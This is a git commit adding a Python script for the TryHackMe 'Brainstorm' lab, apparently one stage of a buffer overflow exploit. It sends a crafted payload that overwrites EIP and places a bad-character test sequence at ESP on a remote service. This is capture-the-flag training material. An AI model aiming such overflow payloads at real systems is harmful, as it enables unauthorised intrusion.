a41b1a99bc5664dd3c8c12a4052db75474374b75
MrW0l05zyn <marcelo@wolcas.cl>
2021-08-09 03:02:39 -0400

    Try Hack Me - brainstorm

---
+++ tryhackme/brainstorm/04-badchars.py
@@ -0,0 +1,36 @@
+#!/usr/bin/python3
+import socket, sys
+from parameters import rhost, rport, timeout, offsetEIP, offsetESP, buffer, badcharsSequence
+from colors import colors
+
+try:
+    # conexión
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    s.connect((rhost, rport))
+    s.recv(1024)
+
+    print(colors.Green + '\nRevisión de badchars...' + colors.End)
+
+    # usuario
+    s.send(b'MrW0l05zyn\r\n')
+    s.recv(1024)
+
+    buf = b''
+    buf += b'A'*(offsetEIP - len(buf))          # offset EIP
+    buf += b'BBBB'                           	# sobrescribir EIP
+    buf += b'\x90'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP
+    buf += badcharsSequence                    	# sobrescribir ESP con secuencia de badchars
+    buf += b'D'*(buffer - len(buf))      	    # relleno de padding
+
+    # badchars
+    s.send(b'' + buf + b'\r\n')
+    s.recv(1024)
+
+except Exception as error:
+    print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
+    sys.exit(0)
+    
+finally:
+    # cierre de conexión
+    s.close()
